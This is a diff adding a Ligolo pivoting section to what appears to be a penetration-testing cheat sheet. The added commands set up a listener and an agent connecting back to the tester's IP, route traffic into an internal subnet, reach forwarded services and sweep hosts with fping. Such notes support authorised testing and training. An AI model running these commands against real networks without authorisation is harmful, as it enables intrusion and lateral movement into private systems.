@@ -1395,6 +1395,24 @@ python3 -m http.server 8888 -d /Upload
 ## Transfer Tools to a Proxy Box
 scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
 
+## Ligolo - Port Forward and Pivot
+sudo ligolo-proxy -autocert -laddr 0.0.0.0:9999
+chmod +x agent;
+./agent -connect $MYIP:9999 -ignore-cert
+session
+interface_create --name ligolo
+tunnel_start --tun ligolo
+ifconfig
+interface_add_route --name ligolo --route 240.0.0.1/32
+interface_add_route --name ligolo --route 192.168.99.0/24
+
+-->> Single Host: Attack Forwarded Ports
+chromium 240.0.0.1:3000
+curl 240.0.0.1:5000
+
+-->> Multiple Hosts: Scan Network Range
+fping -ag 192.168.99.0/24 | tee internal-ips
+
 ## Linux
 [*] Initial Shell
 +---------- Generate resh ----------+
